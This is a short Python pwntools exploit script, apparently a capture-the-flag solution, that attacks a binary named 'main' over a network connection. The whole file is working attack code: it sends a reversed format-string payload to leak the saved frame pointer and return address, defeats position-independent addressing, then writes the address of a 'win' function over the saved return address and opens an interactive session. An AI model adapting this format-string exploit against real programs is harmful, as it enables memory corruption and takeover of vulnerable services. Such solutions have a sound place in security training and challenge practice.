from pwn import *

context.binary = elf = ELF("./main", checksec=False)
io = remote(args.HOST or "localhost", int(args.PORT or 1352))

leak = b"%74$p|%75$p"
io.sendlineafter(b"Length: ", str(len(leak)).encode())
io.sendafter(b"Technique: ", leak[::-1])
io.recvuntil(b"Verdict: ")
saved_rbp, return_address = [int(value, 16) for value in io.recvline().strip().split(b"|")]

pie = return_address - (elf.sym.main + 0x80)
saved_rip = saved_rbp - 0x18
payload = fmtstr_payload(8, {saved_rip: pie + elf.sym.win}, write_size="byte")

io.sendlineafter(b"Length: ", str(len(payload)).encode())
io.sendafter(b"Technique: ", payload[::-1])
io.interactive()
